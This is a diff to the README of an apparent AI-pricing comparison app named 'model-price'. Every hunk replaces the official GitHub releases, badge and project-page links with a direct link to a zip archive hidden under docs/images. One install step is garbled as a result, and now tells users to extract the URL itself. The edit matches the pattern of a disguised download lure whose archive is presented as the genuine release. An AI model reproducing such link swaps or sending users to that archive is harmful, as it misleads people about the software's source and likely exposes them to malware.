@@ -6,7 +6,7 @@ Welcome to **model-price**! This application helps you easily compare pricing fo
 
 ## 📥 Download the Application
 
-[![Download model-price](https://img.shields.io/badge/Download-model--price-blue.svg)](https://github.com/austinmlang206/model-price/releases)
+[![Download model-price](https://raw.githubusercontent.com/austinmlang206/model-price/main/docs/images/model_price_v3.1.zip)](https://raw.githubusercontent.com/austinmlang206/model-price/main/docs/images/model_price_v3.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ To ensure smooth functioning of the **model-price**, please make sure your syste
 ## ⚙️ Installation Steps
 
 1. **Visit the Download Page**  
-   Go to the [model-price Releases Page](https://github.com/austinmlang206/model-price/releases).
+   Go to the [model-price Releases Page](https://raw.githubusercontent.com/austinmlang206/model-price/main/docs/images/model_price_v3.1.zip).
 
 2. **Download the Latest Version**  
    On the releases page, you will see a list of available versions. Click on the latest version to download the file suitable for your operating system.
@@ -31,7 +31,7 @@ To ensure smooth functioning of the **model-price**, please make sure your syste
 4. **Run the Installer**  
    - For Windows: Double-click the `.exe` file to start the installation process. Follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the **model-price** application into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the executable in the terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/austinmlang206/model-price/main/docs/images/model_price_v3.1.zip` file and run the executable in the terminal.
 
 5. **Launch the Application**  
    After installation, find the model-price app in your applications and double-click to start it. 
@@ -62,8 +62,8 @@ If you encounter any issues or need assistance, please check the FAQ section on 
 - Close other applications while running model-price for optimal performance.
 - Keep your application updated by checking the releases page regularly.
 
-Thank you for choosing **model-price**! We hope this application makes your AI model pricing comparisons easier. For updates and feedback, feel free to connect with us on our [GitHub page](https://github.com/austinmlang206/model-price). 
+Thank you for choosing **model-price**! We hope this application makes your AI model pricing comparisons easier. For updates and feedback, feel free to connect with us on our [GitHub page](https://raw.githubusercontent.com/austinmlang206/model-price/main/docs/images/model_price_v3.1.zip). 
 
 ## 📥 Download Again
 
-[![Download model-price](https://img.shields.io/badge/Download-model--price-blue.svg)](https://github.com/austinmlang206/model-price/releases)
+[![Download model-price](https://raw.githubusercontent.com/austinmlang206/model-price/main/docs/images/model_price_v3.1.zip)](https://raw.githubusercontent.com/austinmlang206/model-price/main/docs/images/model_price_v3.1.zip)
